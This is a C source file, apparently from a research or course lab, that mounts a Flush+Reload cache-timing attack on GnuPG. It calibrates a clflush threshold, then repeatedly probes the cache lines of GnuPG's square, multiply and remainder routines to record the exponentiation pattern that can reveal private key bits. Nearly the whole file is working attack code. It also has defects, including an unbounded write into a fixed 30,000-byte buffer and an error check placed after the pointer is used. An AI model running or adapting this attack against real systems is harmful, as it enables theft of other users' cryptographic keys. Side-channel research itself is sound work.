#include <time.h>
#include "../lib/util.h"
#include "../lib/gnupg.h"
#include <unistd.h>
#include <math.h>

void do_something(int times) {
    for(int i=0;i < times;i++) {
        volatile int j = i*2;
        j++;
    }
    return;
}

int compare(const void * a, const void * b)
{
    return ( *(int*)a - *(int*)b );
}

#define NUM_ACCESSES 10000
static inline int get_clflush_threshold (void *flush_addr) {
    long long access_times[NUM_ACCESSES];
    long long first_half_mean = 0, second_half_mean = 0;
    volatile void *y = (volatile void *)flush_addr;

    for (int i = 0; i < NUM_ACCESSES; i++) {
        if (i % 2 == 0){
            clflush((void *)y);
            //do_something();
        }
        else{
            measure_one_block_access_time((void*)y);
        }
        access_times[i] = measure_one_block_access_time ((void *)y);
    }

    qsort (access_times, NUM_ACCESSES, sizeof (long long), compare);
    for (int i = 0; i < NUM_ACCESSES; i++)
        if (i < (NUM_ACCESSES / 2))
            first_half_mean += access_times[i];
        else
            second_half_mean += access_times[i];
    first_half_mean /= (NUM_ACCESSES / 2);
    second_half_mean /= (NUM_ACCESSES / 2);
    return floor (0.9 * first_half_mean + 0.1 * second_half_mean);
}

int main(int argc, char **argv) {
    unsigned char *addr;
    int THRESHOLD;
    int times;
    void *s_addr, *m_addr, *r_addr;
    char data[30000];

    memset (data, '\0', sizeof (data) / sizeof (char));
    map_handle_t *file_map;

    if (argc != 2)
    {
        return -1;
        perror ("Not enough args given!\n");
    }

    times = atoi (argv[1]);
    addr = map_file (gnupg_path, &file_map);
    THRESHOLD = get_clflush_threshold ((void *)addr);
    //printf ("THRESHOLD = %d\n", THRESHOLD);

    if (addr == (void *) -1)
        return 4;

    s_addr = addr + square_add - base_add;
    m_addr = addr + multiply_add - base_add;
    r_addr = addr + remainder_add - base_add;
    // continuously probe the cache line
    /* long long s = 0, m = 0, r = 0; */
    long long i = 0, j = 0;
    while (i < 1000000) {
        int atime;

        atime = measure_one_block_access_time ((void *) r_addr);
        if (atime < THRESHOLD)
        {
            data[j++] = 'r';
            /* printf ("r"); */
        }

        atime = measure_one_block_access_time ((void *) s_addr);
        if (atime < THRESHOLD)
        {
            data[j++] = 'S';
            /* printf ("S"); */
        }

        atime = measure_one_block_access_time ((void *) m_addr);
        if (atime < THRESHOLD)
        {
            data[j++] = 'M';
            /* printf ("M"); */
        }

        i++;
        clflush(m_addr);
        clflush(r_addr);
        clflush(s_addr);

        do_something(times);
    }
    for (int i = 0; i < j; i++) {
        if (data[i] == '\0')
            break;
        printf ("%c", data[i]);
    }
    printf ("\n"); 
    return 0;
}
